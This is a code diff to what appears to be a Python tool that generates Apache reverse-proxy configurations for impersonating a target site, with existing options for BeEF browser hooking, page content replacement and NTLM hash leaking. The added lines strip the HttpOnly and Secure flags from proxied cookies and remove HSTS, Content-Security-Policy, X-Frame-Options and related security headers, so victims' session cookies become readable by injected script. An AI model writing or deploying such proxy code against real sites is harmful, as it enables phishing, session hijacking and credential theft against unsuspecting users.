@@ -270,7 +270,15 @@ if __name__ == "__main__":
                                "\n\tServerName " + domain +
                                "\n\tServerAdmin admin@" + domain +
                                "\n\tProxyPass \"/\" \"" + args.url + "/\"" +
-                               "\n\tProxyPassReverse \"/\" \"" + args.url + "/\"")
+                               "\n\tProxyPassReverse \"/\" \"" + args.url + "/\"" +
+                               "\n\tHeader edit Set-Cookie \"^(.*);[ |][H|h]ttp[O|o]nly(.*)$\" \"$1$2\"" +
+                               "\n\tHeader unset X-Frame-Options" +
+                               "\n\tHeader unset X-XSS-Protection" +
+                               "\n\tHeader unset X-Content-Type-Options" +
+                               "\n\tHeader unset Referer-Policy" +
+                               "\n\tHeader unset Content-Security-Policy" +
+                               "\n\tHeader unset X-Content-Security-Policy" +
+                               "\n\tHeader unset Content-Security-Policy-Report-Only")
 
         if args.replace is not None or args.beef is not None or args.leak_ntlm is not None:
             http_config_file.write("\n\tRequestHeader unset Accept-Encoding" +
@@ -327,7 +335,17 @@ if __name__ == "__main__":
                                     "\n\t\tServerName " + domain +
                                     "\n\t\tServerAdmin admin@" + domain +
                                     "\n\t\tProxyPass \"/\" \"" + args.url + "/\"" +
-                                    "\n\t\tProxyPassReverse \"/\" \"" + args.url + "/\"")
+                                    "\n\t\tProxyPassReverse \"/\" \"" + args.url + "/\"" +
+                                    "\n\t\tHeader edit Set-Cookie \"^(.*);[ |][H|h]ttp[O|o]nly(.*)$\" \"$1$2\"" +
+                                    "\n\t\tHeader edit Set-Cookie \"^(.*);[ |][S|s]ecure(.*)$\" \"$1$2\"" +
+                                    "\n\t\tHeader unset Strict-Transport-Security" +
+                                    "\n\t\tHeader unset X-Frame-Options" +
+                                    "\n\t\tHeader unset X-XSS-Protection" +
+                                    "\n\t\tHeader unset X-Content-Type-Options" +
+                                    "\n\t\tHeader unset Referer-Policy" +
+                                    "\n\t\tHeader unset Content-Security-Policy" +
+                                    "\n\t\tHeader unset X-Content-Security-Policy" +
+                                    "\n\t\tHeader unset Content-Security-Policy-Report-Only")
 
             if args.replace is not None or args.beef is not None or args.leak_ntlm is not None:
                 https_config_file.write("\n\t\tRequestHeader unset Accept-Encoding" +
